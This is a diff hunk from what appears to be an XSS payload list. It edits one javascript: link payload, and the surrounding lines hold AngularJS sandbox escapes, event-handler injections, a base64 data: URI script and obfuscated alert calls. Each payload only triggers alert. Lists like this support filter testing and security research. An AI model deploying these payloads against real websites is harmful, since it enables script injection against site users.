@@ -929,7 +929,7 @@ ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+\"'");}}}}
 <acronym id=x tabindex=1 onfocus=alert(1)></acronym>
-<a data-orig-ref=" alert(1)" data-orig-proto="javascript" href="javascript:// alert(1)">clickme</a>
+<a data-orig-ref="alert(1)" data-orig-proto="javascript" href="javascript://alert(1)">clickme</a>
 [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
 <address id=x tabindex=1 onfocus=alert(1)></address>
 =a=document.domain;top["al"%2b"ert"](/%2a%2a/a)>
